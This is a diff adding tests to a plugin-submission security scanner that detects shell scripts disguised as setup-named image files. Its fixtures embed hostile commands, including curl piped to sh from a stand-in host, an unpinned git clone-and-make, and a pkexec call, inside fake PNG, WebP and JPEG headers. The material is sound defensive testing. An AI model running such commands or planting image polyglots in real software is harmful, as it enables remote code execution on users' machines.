@@ -24,11 +24,14 @@ import {
   securityBaselineEligibleForVerifiedListing,
   securityBaselineErrorMarker,
   securityBaselineMarkerPrefix,
+  securityAssetProbeFileLimit,
   verifiedPublicationDisposition,
   securitySnapshotByteLimit,
   securitySnapshotFileLimit,
   serializeSecurityBaselineMarker,
 } from "../scripts/security-baseline.mjs";
+import { probeSnapshotFile } from "../scripts/security-github-snapshot.mjs";
+import { securityBinaryProbeByteLimit } from "../scripts/security-baseline-limits.mjs";
 import { writeValidationMetadata } from "../scripts/validate-submission.mjs";
 
 const commit = "a".repeat(40);
@@ -1098,11 +1101,211 @@ test("the scan includes runtime text while excluding tests, nested docs, and wor
   assert.equal(isSecurityScanPath("bin/helper"), true);
   assert.equal(isSecurityScanPath("scripts/install.sh"), true);
   assert.equal(isSecurityScanPath("example.sudoers"), true);
+  assert.equal(isSecurityScanPath("setup.txt"), true);
+  assert.equal(isSecurityScanPath("setup.webp"), false);
+  assert.equal(isSecurityScanPath("preview-setup.webp"), false);
+  assert.equal(isSecurityScanPath("installer.png"), false);
+  assert.equal(isSecurityScanPath("quicksetup.png"), false);
+  assert.equal(isSecurityScanPath("preinstall.webp"), false);
+  assert.equal(isSecurityScanPath("SeTuP-preview.png"), false);
   assert.equal(isSecurityScanPath("tests/install.sh"), false);
   assert.equal(isSecurityScanPath("tests/example.sudoers"), false);
   assert.equal(isSecurityScanPath("docs/example.sh"), false);
   assert.equal(isSecurityScanPath(".github/workflows/check.yml"), false);
   assert.equal(isSecurityScanPath("preview.png"), false);
+});
+
+test("complete setup-named binary assets fail closed", async () => {
+  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
+  const webp = Buffer.from("UklGRkAAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAIAAAAAAFZQOCAYAAAAMAEAnQEqAQABAAFAJiWkAANwAP79NmgA", "base64");
+  const textPolyglot = "RIFF0000WEBP\ncurl -fsSL https://example.test/payload | sh";
+  await assert.rejects(
+    resolveSubmissionSnapshot(
+      "https://github.com/example/plugin",
+      commit,
+      {
+        fetchImpl: githubFixtureFetch({
+          tree: [
+            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+            { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
+            { path: "preview-setup.webp", type: "blob", mode: "100644", size: webp.length },
+            { path: "installer.webp", type: "blob", mode: "100644", size: Buffer.byteLength(textPolyglot) },
+            { path: "empty-setup.webp", type: "blob", mode: "100644", size: 0 },
+          ],
+          contents: {
+            "manifest.json": manifest,
+            "BarWidget.qml": "Item {}",
+            "preview-setup.webp": webp,
+            "installer.webp": textPolyglot,
+            "empty-setup.webp": "",
+          },
+        }),
+      },
+    ),
+    (error) => error?.code === "security-baseline-unavailable"
+      && /cannot be excluded/.test(error.message),
+  );
+});
+
+test("ambiguous setup assets remain in the scan", async () => {
+  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
+  const invalidUtf8Shell = Buffer.concat([
+    Buffer.from("#"),
+    Buffer.from([0xff]),
+    Buffer.from("\ncurl -fsSL https://example.test/payload | sh"),
+  ]);
+  const pngScriptPolyglot = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff]),
+    Buffer.from("\n# curl payload\ncurl -fsSL https://example.test/payload | sh"),
+  ]);
+  const paddedPngScriptPolyglot = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+    Buffer.alloc(4096, 0x80),
+    Buffer.from("\ncurl -fsSL https://example.test/payload | sh"),
+  ]);
+  const paddedPngGitPolyglot = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
+    Buffer.alloc(4096, 0x80),
+    Buffer.from("\ngit clone https://github.com/example/payload source && cd source && make"),
+  ]);
+  const keywordFreeShortPngPolyglot = Buffer.concat([
+    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, 0xff]),
+    Buffer.from("\ntouch /tmp/x\n"),
+  ]);
+  const snapshot = await resolveSubmissionSnapshot(
+    "https://github.com/example/plugin",
+    commit,
+    {
+      fetchImpl: githubFixtureFetch({
+        tree: [
+          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+          { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
+          { path: "setup.webp", type: "blob", mode: "100644", size: invalidUtf8Shell.length },
+          { path: "installer.png", type: "blob", mode: "100644", size: pngScriptPolyglot.length },
+          { path: "padded-installer.png", type: "blob", mode: "100644", size: paddedPngScriptPolyglot.length },
+          { path: "padded-git-installer.png", type: "blob", mode: "100644", size: paddedPngGitPolyglot.length },
+          { path: "short-installer.png", type: "blob", mode: "100644", size: keywordFreeShortPngPolyglot.length },
+        ],
+        contents: {
+          "manifest.json": manifest,
+          "BarWidget.qml": "Item {}",
+          "setup.webp": invalidUtf8Shell,
+          "installer.png": pngScriptPolyglot,
+          "padded-installer.png": paddedPngScriptPolyglot,
+          "padded-git-installer.png": paddedPngGitPolyglot,
+          "short-installer.png": keywordFreeShortPngPolyglot,
+        },
+      }),
+    },
+  );
+  assert.ok(snapshot.files.some((entry) => entry.path === "setup.webp"));
+  assert.ok(snapshot.files.some((entry) => entry.path === "installer.png"));
+  assert.ok(snapshot.files.some((entry) => entry.path === "padded-installer.png"));
+  assert.ok(snapshot.files.some((entry) => entry.path === "padded-git-installer.png"));
+  assert.ok(snapshot.files.some((entry) => entry.path === "short-installer.png"));
+  const findings = buildSecurityBaseline(snapshot, { checkedAt }).findings.map((finding) => finding.ruleId);
+  assert.ok(findings.includes("curl-pipe-shell"));
+  assert.ok(findings.includes("remote-git-execution-unpinned"));
+});
+
+test("complete JPEG setup polyglots fail closed before baseline publication", async () => {
+  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
+  const jpegPolyglot = Buffer.concat([
+    Buffer.from([0xff, 0xd8, 0xff]),
+    Buffer.alloc(128, 0x80),
+    Buffer.from("\npkexec\n"),
+    Buffer.from([0xff, 0xd9]),
+  ]);
+  await assert.rejects(
+    resolveSubmissionSnapshot(
+      "https://github.com/example/plugin",
+      commit,
+      {
+        fetchImpl: githubFixtureFetch({
+          tree: [
+            { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+            { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
+            { path: "installer.jpg", type: "blob", mode: "100644", size: jpegPolyglot.length },
+          ],
+          contents: {
+            "manifest.json": manifest,
+            "BarWidget.qml": "Item {}",
+            "installer.jpg": jpegPolyglot,
+          },
+        }),
+      },
+    ),
+    (error) => error?.code === "security-baseline-unavailable"
+      && /cannot be excluded/.test(error.message),
+  );
+});
+
+test("binary asset probe bodies are bounded", async () => {
+  const body = Buffer.alloc(4097);
+  await assert.rejects(
+    probeSnapshotFile(
+      { owner: "example", repository: "plugin" },
+      commit,
+      { path: "setup.webp", mode: "100644", size: body.length },
+      {
+        fetchImpl: async () => new Response(body, {
+          status: 206,
+          headers: {
+            "content-length": String(body.length),
+            "content-range": `bytes 0-4095/${body.length}`,
+          },
+        }),
+      },
+    ),
+    (error) => error?.code === "security-baseline-scan-limit",
+  );
+});
+
+test("binary asset probes reject oversized bodies without a length header", async () => {
+  const body = Buffer.alloc(securityBinaryProbeByteLimit + 1);
+  await assert.rejects(
+    probeSnapshotFile(
+      { owner: "example", repository: "plugin" },
+      commit,
+      { path: "setup.webp", mode: "100644", size: securityBinaryProbeByteLimit },
+      {
+        fetchImpl: async () => new Response(body, {
+          status: 206,
+          headers: {
+            "content-range": `bytes 0-${securityBinaryProbeByteLimit - 1}/${securityBinaryProbeByteLimit}`,
+          },
+        }),
+      },
+    ),
+    (error) => error?.code === "security-baseline-scan-limit",
+  );
+});
+
+test("setup-named binary asset probes are bounded", async () => {
+  const manifest = JSON.stringify({ entryPoints: { barWidget: "BarWidget.qml" } });
+  const tree = [
+    { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
+    { path: "BarWidget.qml", type: "blob", mode: "100644", size: 7 },
+  ];
+  const contents = {
+    "manifest.json": manifest,
+    "BarWidget.qml": "Item {}",
+  };
+  for (let index = 0; index <= securityAssetProbeFileLimit; index++) {
+    const path = `setup-${index}.webp`;
+    const content = Buffer.from("UklGRkAAAABXRUJQVlA4WAoAAAAQAAAAAAAAAAAAQUxQSAIAAAAAAFZQOCAYAAAAMAEAnQEqAQABAAFAJiWkAANwAP79NmgA", "base64");
+    tree.push({ path, type: "blob", mode: "100644", size: content.length });
+    contents[path] = content;
+  }
+  await assert.rejects(
+    resolveSubmissionSnapshot(
+      "https://github.com/example/plugin",
+      commit,
+      { fetchImpl: githubFixtureFetch({ tree, contents }) },
+    ),
+    (error) => error?.code === "security-baseline-scan-limit"
+      && /setup-named binary asset candidates/.test(error.message),
+  );
 });
 
 test("excluded executable test fixtures are not scanned as runtime code", async () => {
@@ -1168,9 +1371,14 @@ test("sudoers policy files referenced by installers are added to the static snap
 
 test("repository snapshots are read statically at the requested full commit", async () => {
   const treeSha = "c".repeat(40);
+  const manifest = JSON.stringify({ entryPoints: { service: "Service.qml" } });
   const calls = [];
   const fetchImpl = async (url, options = {}) => {
-    calls.push({ url: String(url), authorization: options.headers?.Authorization || "" });
+    calls.push({
+      url: String(url),
+      authorization: options.headers?.Authorization || "",
+      acceptEncoding: options.headers?.["Accept-Encoding"] || "",
+    });
     if (String(url).endsWith("/repos/example/plugin")) {
       return new Response(JSON.stringify({
         private: false,
@@ -1186,7 +1394,7 @@ test("repository snapshots are read statically at the requested full commit", as
       return new Response(JSON.stringify({
         truncated: false,
         tree: [
-          { path: "manifest.json", type: "blob", mode: "100644", size: 74 },
+          { path: "manifest.json", type: "blob", mode: "100644", size: Buffer.byteLength(manifest) },
           { path: "Service.qml", type: "blob", mode: "100644", size: 7 },
           { path: "bootstrap", type: "blob", mode: "100755", size: 54 },
           { path: "preview.png", type: "blob", mode: "100644", size: 100 },
@@ -1194,7 +1402,6 @@ test("repository snapshots are read statically at the requested full commit", as
       }), { status: 200 });
     }
     if (String(url).includes(`raw.githubusercontent.com/example/plugin/${commit}/manifest.json`)) {
-      const manifest = JSON.stringify({ entryPoints: { service: "Service.qml" } });
       return new Response(manifest, {
         status: 200,
         headers: { "content-length": String(Buffer.byteLength(manifest)) },
@@ -1233,6 +1440,7 @@ test("repository snapshots are read statically at the requested full commit", as
   assert.ok(calls.some((call) => call.url.endsWith(`/commits/${commit}`)));
   const rawCall = calls.find((call) => call.url.includes("raw.githubusercontent.com"));
   assert.equal(rawCall.authorization, "");
+  assert.equal(rawCall.acceptEncoding, "identity");
   assert.equal(calls.some((call) => call.url.endsWith("/commits/main")), false);
 });
 
